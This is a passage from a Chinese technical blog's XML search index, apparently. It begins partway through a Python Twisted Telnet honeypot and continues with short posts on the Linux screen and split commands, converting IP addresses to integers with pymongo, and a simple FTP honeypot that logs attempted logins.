self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          Links"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          Music"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          Pictures"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"2016/04/11  17:55    &lt;DIR&gt;          Videos"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"               0 File(s)              0 bytes"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"              14 Dir(s) 33,003,470,848 bytes free "</span>)</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line">        <span class="keyword">elif</span> command.startswith(<span class="string">'whoami'</span>):</span><br><span class="line">            self.sendLine(<span class="string">"win-u5vm2v23fm5\\administrator"</span>)</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line">        <span class="keyword">elif</span> command.startswith(<span class="string">'ipconfig'</span>):</span><br><span class="line">            self.sendLine(<span class="string">"Ethernet adapter 本地连接: "</span>)</span><br><span class="line">            self.sendLine(<span class="string">"Connection-specific DNS Suffix  . :"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"Link-local IPv6 Address . . . . . : fe80::b424:11e8:941f:6fa3%11"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"IPv4 Address. . . . . . . . . . . : 192.168.1.105"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"Subnet Mask . . . . . . . . . . . : 255.255.255.0"</span>)</span><br><span class="line">            self.sendLine(<span class="string">"Default Gateway . . . . . . . . . : 192.168.1.255."</span>)</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line">        <span class="keyword">elif</span> command.startswith(<span class="string">'cd'</span>):</span><br><span class="line">            self.sendLine(<span class="string">"Device not ready: I/O Error."</span>)</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.sendLine(<span class="string">"'"</span> + line + <span class="string">"'"</span> <span class="string">" is not recognized as an internal or external command,\n\roperable program or batch file."</span>)</span><br><span class="line">            self.sendLine(<span class="string">""</span>)</span><br><span class="line">            self.transport.write(self.prefix)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TelnetFactory</span><span class="params">(Factory)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildProtocol</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Telnet()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reactor.listenTCP(<span class="number">233</span>, TelnetFactory())</span><br><span class="line">reactor.run()</span><br></pre></td></tr></table></figure><h2 id="0x02-结果截图"><a href="#0x02-结果截图" class="headerlink" title="0x02 结果截图"></a>0x02 结果截图</h2><p>1.连接登录界面：<br><img src="/static/picture/telnet_honeypot_login.png" alt="登录"><br>2.命令执行界面：<br><img src="/static/picture/telnet_honeypot_command.png" alt="命令执行"></p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Honeypot </tag>
            
            <tag> Telnet </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Screen-解决Putty链接断开程序终止问题</title>
      <link href="/2016/06/02/screen_putty/"/>
      <url>/2016/06/02/screen_putty/</url>
      <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>&emsp;&emsp;刚开始接触linux，需要putty(ssh)远程连接，执行长时间的程序服务，然而由于网络不稳定，或者突然断电，也或者是手抖了一下连接断开，再次连接后发现之前运行的程序终止。<br>&emsp;&emsp;这时候就需要用到linux下强大的screen程序了。<br><a id="more"></a></p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><pre><code>yum install screen</code></pre><p>或者：</p><pre><code>apt-get install screen</code></pre><h2 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h2><p><strong>基本使用：</strong></p><ol><li>ssh连接成功以后，命令行输入screen 得到一个session（出现提示信息直接enter回车即可）,</li><li>然后运行你的程序或者其他操作，这时候你就可以放心大胆的做其他的各种断开连接测试，</li><li>再次登录运行screen -ls查看session得到id(前面的数字)，然后screen -r id（你的session id）,一切还是原来的样子。</li></ol><p><strong>扩展使用：</strong><br><strong>screen命令：</strong><br>screen&emsp;&emsp;创建一个虚拟终端并且登录之<br>screen –ls&emsp;&emsp;列出当前所有虚拟终端<br>screen [-d] -r sessionid&emsp;&emsp;进入指定的虚拟终端<br>screen –x sessionid&emsp;&emsp;不同终端共享一个session</p><p><strong>开启screen以后对screen窗口管理：</strong><br>&emsp;&emsp;键盘上键入的信息是直接发送给当前screen窗口必须用其他方式向screen窗口管理器发出命令，默认情况下，screen接收以CTRL+a开始的命令。这种命令形式在screen中叫做键绑定</p><table><thead><tr><th>命令</th><th>功能描述</th></tr></thead><tbody><tr><td>CTRL+a然后c</td><td>创建新的窗口</td></tr><tr><td>CTRL+a然后n</td><td>切换到下一个窗口</td></tr><tr><td>CTRL+a然后p</td><td>切换到上一个窗口</td></tr><tr><td>CTRL+a然后&#124;</td><td>纵向分割屏幕</td></tr><tr><td>CTRL+a然后s</td><td>水平分割屏幕</td></tr><tr><td>CTRL+a然后Tab</td><td>切换分割的区域</td></tr><tr><td>CTRL+a然后”</td><td>显示当前所有窗口列表</td></tr><tr><td>CTRL+a然后d</td><td>暂时离开这个session(不中断)</td></tr></tbody></table><pre><code>#注：水平/垂直分割屏幕，切换后要先创建窗口（CTRL+a然后c），才能下一步操作</code></pre><p><strong>关闭一个终端:</strong><br>&emsp;&emsp;方式1：可以先进入此终端，然后将所有窗口关闭，当所有窗口都关闭的时候，终端自动关闭，并且出现“[screen is terminating]”<br>&emsp;&emsp;方式2：screen –ls ,然后kill +对应的进程号</p><h2 id="0x04-屌炸天的实例"><a href="#0x04-屌炸天的实例" class="headerlink" title="0x04 屌炸天的实例"></a>0x04 屌炸天的实例</h2><p>01:两个putty session共享一个screen，可以在两边相互操作，实时同步显示<br><img src="/static/picture/screen-1.png" alt="多屏共享，同时操作"></p><hr><p>02:在一个putty session内，开启多个显示窗口，可以一边运行程序，一边查看日志，还能看其他信息</p><p><img src="/static/picture/screen-2.png" alt="单个session,多个窗口显示"></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux-split命令</title>
      <link href="/2016/05/30/Linux_split/"/>
      <url>/2016/05/30/Linux_split/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;当一个几百G的大文件需要分割成多个小文件，Linux下的split命令可以按行、按文件大小分割。</p><a id="more"></a><h2 id="0x01使用"><a href="#0x01使用" class="headerlink" title="0x01使用"></a>0x01使用</h2><p>split [-bl] filename 生成文件的前缀名</p><p>&emsp;&emsp;在Linux命令行输入split –help可以弹出使用信息如下：</p><pre><code>-a, --suffix-length=N   generate suffixes of length N (default 2)      --additional-suffix=SUFFIX  append an additional SUFFIX to file names.  -b, --bytes=SIZE        put SIZE bytes per output file  -C, --line-bytes=SIZE   put at most SIZE bytes of lines per output file  -d, --numeric-suffixes[=FROM]  use numeric suffixes instead of alphabetic.                                   FROM changes the start value (default 0).  -e, --elide-empty-files  do not generate empty output files with &apos;-n&apos;      --filter=COMMAND    write to shell COMMAND; file name is $FILE  -l, --lines=NUMBER      put NUMBER lines per output file  -n, --number=CHUNKS     generate CHUNKS output files.  See below  -u, --unbuffered        immediately copy input to output with &apos;-n r/...&apos;      --verbose           print a diagnostic just before each                            output file is opened      --help     display this help and exit      --version  output version information and exitSIZE is an integer and optional unit (example: 10M is 10*1024*1024).  Unitsare K, M, G, T, P, E, Z, Y (powers of 1024) or KB, MB, ... (powers of 1000).</code></pre><hr><p> <strong>常用参数介绍：</strong></p><pre><code>-a 设置切割后文件名的可变范围（默认为2）即xaa-xzz-b 设置按大小分割文件(可以使用K, M, G, T, P, E, Z, Y (powers of 1024) or KB, MB, ... (powers of 1000))-C 设置每一行的最大bytes-d 将输出文件名可变改为数字模式（未改变-a参数的话，文件名：x00-x99）-e 省略空文件输出-l 设置按文件行数分割文件</code></pre><h2 id="0x02使用实例："><a href="#0x02使用实例：" class="headerlink" title="0x02使用实例："></a>0x02使用实例：</h2><p>1、将文件test.txt按每100M大小分割，并且前缀名为test</p><pre><code>split -b 100M test.txt test</code></pre><p><img src="/static/picture/split-b.jpg" alt="按文件大小分割"><br>2、将文件test.txt按每10000行分割，前缀名为test，并设置文件命名为数字</p><pre><code>split -l 10000 -d test.txt test</code></pre><p><img src="/static/picture/split-l.jpg" alt="按行数分割"></p>]]></content>
      
      <categories>
          
          <category> 技术研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pymongo-ip 地址 string/int转换</title>
      <link href="/2016/05/26/Pymongo_ip_string2int/"/>
      <url>/2016/05/26/Pymongo_ip_string2int/</url>
      <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>&emsp;&emsp;为了使得项目支持IP地址的C段查询，提高查询数据，计划先把IP地址”点分十进制”字符串表示转换为数值表示<br><a id="more"></a></p><h1 id="0x01-利用inet-aton（）函数："><a href="#0x01-利用inet-aton（）函数：" class="headerlink" title="0x01 利用inet_aton（）函数："></a>0x01 利用inet_aton（）函数：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_to_int</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">'!I'</span>, socket.inet_aton(ip))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_ip</span><span class="params">(ip_int)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(struct.pack(<span class="string">'!L'</span>, ip_int))</span><br></pre></td></tr></table></figure><h1 id="0x02-原理分析："><a href="#0x02-原理分析：" class="headerlink" title="0x02 原理分析："></a>0x02 原理分析：</h1><p>IP地址是一个32位的二进制数,为了方便人们记忆，通常被分割为4个“8位二进制数”（也就是4个字节），称这种方式为“点分十进制”。<br>例：<br>IP地址11001010010111010111100000101101<br>点分十进制应该表示为202.93.120.45</p><h2 id="ip字符串转换int"><a href="#ip字符串转换int" class="headerlink" title="ip字符串转换int"></a>ip字符串转换int</h2><p>转换算法是：将ip字符串以“.”分割开为4个段存储于数组a[0],a[1],a[2],a[3](a[0]为左起第一段);转换结果为a[0]&lt;&lt;8*3+a[1]&lt;&lt;8*2+a[2]&lt;&lt;8*1+a[3]</p><h2 id="ip-int转换字符串（点分十进制"><a href="#ip-int转换字符串（点分十进制" class="headerlink" title="ip int转换字符串（点分十进制)"></a>ip int转换字符串（点分十进制)</h2><p>转换算法为：i&amp;0x000000ff+’.’+(i&amp;0x0000ff00)&gt;&gt;8+’.’+(i&amp;0x0000ff0000)&gt;&gt;16+’.’+(i&amp;0xff000000)&gt;&gt;24</p><h1 id="0x03-pymongo实例："><a href="#0x03-pymongo实例：" class="headerlink" title="0x03 pymongo实例："></a>0x03 pymongo实例：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_to_int</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">'!I'</span>, socket.inet_aton(ip))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_ip</span><span class="params">(ip_int)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(struct.pack(<span class="string">'!L'</span>, ip_int))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    clint = pymongo.MongoClient(<span class="string">'127.0.0.1'</span>, <span class="number">27017</span>)</span><br><span class="line">    db = clint.database_name  <span class="comment"># 修改为你的库名</span></span><br><span class="line">    <span class="comment">#如果需要认证，把下面注释语句打开修改对应用户名密码即可</span></span><br><span class="line">    <span class="comment"># db.authenticate('username', 'password')</span></span><br><span class="line">    collection = db.collection_name  <span class="comment"># 修改为你的集合名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> collection.find(&#123;&#125;):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            collection.update(&#123;<span class="string">"ip"</span>: i[<span class="string">"ip"</span>]&#125;, &#123;<span class="string">"$set"</span>: &#123;<span class="string">"ip"</span>: ip_to_int(i[<span class="string">"ip"</span>])&#125;&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pymongo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于python Twisted库的Ftp简单蜜罐</title>
      <link href="/2016/05/17/python_twisted_ftp_honeypot/"/>
      <url>/2016/05/17/python_twisted_ftp_honeypot/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&emsp;&emsp;最近需要写蜜罐模拟，用python的twisted库实现了一个简单的ftp蜜罐，可以用浏览器登录，收集用户名密码。<br><a id="more"></a></p><h2 id="0x01具体代码"><a href="#0x01具体代码" class="headerlink" title="0x01具体代码"></a>0x01具体代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet.protocol <span class="keyword">import</span> Factory</span><br><span class="line"><span class="keyword">from</span> twisted.protocols.basic <span class="keyword">import</span> LineReceiver</span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">WELCOME_MSG = <span class="string">'220 (vsFTPd 2.0.5) '</span></span><br><span class="line">GOODBYE_MSG = <span class="string">'221 Goodbye.'</span></span><br><span class="line">USER_OK_NEED_PASS = <span class="string">'331 Please specify the password.'</span></span><br><span class="line">PLEASE_LOGIN = <span class="string">'530 Please login with USER and PASS.'</span></span><br><span class="line">UNKNOWN_COMMAND = <span class="string">'500 Unknown command.'</span></span><br><span class="line">LOGIN_WITH_USER_FIRST = <span class="string">'503 Login with USER first.'</span></span><br><span class="line">LOGIN_FAIL = <span class="string">'530 Login incorrect.'</span></span><br><span class="line">REQ_ACTN_NOT_TAKEN = <span class="string">'550 Requested action not taken: '</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ftp</span><span class="params">(LineReceiver)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="keyword">None</span></span><br><span class="line">        self.password = <span class="keyword">None</span></span><br><span class="line">        self.state = <span class="string">'get_name'</span></span><br><span class="line">        <span class="comment"># logging.basicConfig(filename='./ftp.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s', datefmt = '%m/%d/%Y %I:%M:%S %p')</span></span><br><span class="line">        logging.basicConfig(filename=<span class="string">'./ftp.log'</span>, level=logging.DEBUG, format=<span class="string">'%(asctime)s %(levelname)s: %(message)s'</span>, datefmt = <span class="string">'%Y-%m-%d %I:%M:%S'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionMade</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sendLine(WELCOME_MSG)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionLost</span><span class="params">(self,line)</span>:</span></span><br><span class="line">        self.sendLine(GOODBYE_MSG)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lineReceived</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'get_name'</span>:</span><br><span class="line">            self.name = line</span><br><span class="line">            self.state = <span class="string">'get_pass'</span></span><br><span class="line">            self.sendLine(USER_OK_NEED_PASS)</span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'get_pass'</span>:</span><br><span class="line">            self.password = line</span><br><span class="line">            logging.info(self.name +<span class="string">' '</span> + self.password )</span><br><span class="line">            self.state = <span class="string">'get_name'</span></span><br><span class="line">            self.sendLine(LOGIN_FAIL)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpFactory</span><span class="params">(Factory)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildProtocol</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Ftp()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reactor.listenTCP(<span class="number">21</span>, FtpFactory())</span><br><span class="line">reactor.run()</span><br></pre></td></tr></table></figure><h2 id="0x02结果截图"><a href="#0x02结果截图" class="headerlink" title="0x02结果截图"></a>0x02结果截图</h2><p>1.浏览器的登录界面展示<br><img src="/static/picture/ftp_honeypot_browser_login.jpg" alt="浏览器登录界面"></p><hr><p>2.Telnet连接界面<br><img src="/static/picture/ftp_honeypot_telnet_link.jpg" alt="Telnet连接界面"></p><hr><p>3.记录的日志<br><img src="/static/picture/ftp_honeypot_log.jpg" alt="记录的日志"></p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Ftp </tag>
            
            <tag> Honeypot </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
